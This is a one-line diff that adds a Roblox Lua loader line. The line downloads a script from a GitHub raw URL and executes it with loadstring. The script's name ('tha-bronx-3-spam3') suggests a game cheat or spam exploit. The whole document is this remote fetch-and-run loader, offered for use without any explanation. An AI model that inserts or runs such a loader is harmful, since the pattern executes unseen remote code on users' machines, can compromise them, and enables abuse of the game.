@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/tha-bronx-3-spam3-vvyighskih8nvl.lua"))()
